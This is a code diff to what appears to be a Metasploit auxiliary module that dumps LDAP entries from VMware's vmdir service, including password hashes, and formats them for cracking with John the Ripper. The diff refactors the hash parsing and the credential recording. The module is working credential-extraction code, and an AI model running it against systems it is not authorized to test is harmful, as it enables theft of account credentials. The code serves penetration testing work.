@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Dumping LDAP data from vmdir service at #{peer}")
 
       # A "-" meta-attribute will dump userPassword (hat tip Hynek)
-      # https://github.com/vmware/lightwave/blob/637a1935fdd3cae4df6aa8925c69fd5744ab1a88/vmdir/server/ldap-head/result.c#L647-L654
+      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/ldap-head/result.c#L647-L654
       entries = ldap.search(base: base_dn, attributes: %w[* + -])
     end
 
@@ -144,46 +144,51 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
+    service_details = {
+      workspace_id: myworkspace_id,
+      module_fullname: fullname,
+      origin_type: :service,
+      address: rhost,
+      port: rport,
+      protocol: 'tcp',
+      service_name: 'vmdir/ldap'
+    }
+
     entries.each do |entry|
       # This is the "username"
       dn = entry.dn
 
-      # https://github.com/vmware/lightwave/blob/637a1935fdd3cae4df6aa8925c69fd5744ab1a88/lwraft/server/middle-layer/password.c#L36-L45
+      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/middle-layer/password.c#L32-L76
       type, hash, salt = entry[:userpassword].first.unpack('CH128H32')
 
-      unless type == 1
-        vprint_error("Hash type #{type} is not supported yet (#{dn})")
+      case type
+      when 1
+        unless hash.length == 128
+          vprint_error("Type #{type} hash length is not 128 digits (#{dn})")
+          next
+        end
+
+        unless salt.length == 32
+          vprint_error("Type #{type} salt length is not 32 digits (#{dn})")
+          next
+        end
+
+        # https://github.com/magnumripper/JohnTheRipper/blob/2778d2e9df4aa852d0bc4bfbb7b7f3dde2935b0c/doc/DYNAMIC#L197
+        jtr_format = 'dynamic_82'
+        john_hash = "$#{jtr_format}$#{hash}$HEX$#{salt}"
+      else
+        vprint_error("Hash type #{type.inspect} is not supported yet (#{dn})")
         next
       end
-
-      unless hash.length == 128
-        vprint_error("Hash length is #{hash.length} digits, not 128 (#{dn})")
-        next
-      end
-
-      unless salt.length == 32
-        vprint_error("Salt length is #{salt.length} digits, not 32 (#{dn})")
-        next
-      end
-
-      # https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/doc/DYNAMIC
-      john_hash = "$dynamic_82$#{hash}$HEX$#{salt}"
 
       print_good("Credentials found: #{dn}:#{john_hash}")
 
-      create_credential(
-        workspace_id: myworkspace_id,
-        module_fullname: fullname,
-        origin_type: :service,
-        address: rhost,
-        port: rport,
-        protocol: 'tcp',
-        service_name: 'vmdir/ldap',
+      create_credential(service_details.merge(
         username: dn,
         private_data: john_hash,
         private_type: :nonreplayable_hash,
-        jtr_format: 'dynamic_82'
-      )
+        jtr_format: jtr_format
+      ))
     end
   end
 
